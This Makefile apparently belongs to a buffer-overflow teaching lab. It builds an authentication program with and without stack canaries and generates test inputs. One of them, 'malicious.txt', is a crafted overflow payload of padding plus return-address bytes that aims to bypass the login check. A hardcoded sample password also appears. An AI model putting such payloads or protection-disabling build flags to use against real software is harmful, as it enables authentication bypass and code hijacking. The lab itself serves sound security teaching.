all: vulnerable canary

vulnerable: authenticaterr.c
	gcc -g -fno-stack-protector -O0 authenticaterr.c -o authenticaterr

canary: authenticaterr.c
	gcc -g -fstack-protector -O0 authenticaterr.c -o authenticaterr_canary

input:
	/bin/echo -e "user" > user.txt
	/bin/echo -e "53cr3+" > admin.txt
	/bin/echo -e "useraaaaaaaaaaaaaa\\xa9\\x51\\x55\\x55\\x55\\x55\\x0\\x0" > malicious.txt

clean:
	rm -f core *.out *.o authenticaterr *.txt
